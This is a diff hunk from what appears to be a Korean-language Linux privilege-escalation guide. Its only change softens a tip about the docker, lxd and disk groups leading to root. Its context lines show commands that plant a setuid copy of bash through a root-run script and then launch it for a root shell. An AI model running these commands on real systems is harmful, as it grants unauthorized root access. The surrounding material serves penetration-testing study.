@@ -76,7 +76,7 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/root_scrip
 /tmp/rootbash -p
 ```
 
-> 판단 포인트: 특수 그룹 소속(`docker`, `lxd`, `disk` 등)은 그 자체가 루트로 가는 지름길입니다. `id` 출력의 그룹을 흘려보지 않습니다.
+> 판단 포인트: 특수 그룹 소속(`docker`, `lxd`, `disk` 등)은 그 자체로 루트 권한으로 이어질 수 있습니다. `id` 출력의 그룹을 흘려보지 않습니다.
 
 ## 함께 보기
 
